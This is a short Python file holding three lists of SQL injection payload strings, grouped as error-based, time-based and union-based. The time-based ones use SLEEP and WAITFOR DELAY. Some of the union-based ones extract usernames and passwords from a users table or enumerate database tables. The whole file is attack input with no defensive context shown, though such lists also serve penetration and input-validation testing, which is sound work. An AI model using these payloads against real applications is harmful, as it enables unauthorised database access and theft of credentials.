# A list of SQL injection payloads for different types of injections

# Error-based payloads
ERROR_BASED_PAYLOADS = [
    "' OR '1'='1' -- ",
    "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "'; SELECT * FROM non_existing_table; -- ",
    "' AND (SELECT COUNT(*) FROM users) > 0 -- "
]

# Time-based payloads
TIME_BASED_PAYLOADS = [
    "' OR IF(1=1, SLEEP(5), 0) -- ",
    "'; IF(1=1, SLEEP(5), 0); -- ",
    "'; WAITFOR DELAY '00:00:05'; -- "
]

# Union-based payloads
UNION_BASED_PAYLOADS = [
    "' UNION SELECT NULL, username, password FROM users -- ",
    "' UNION SELECT NULL, database(), user() -- ",
    "' UNION SELECT NULL, table_name FROM information_schema.tables -- "
]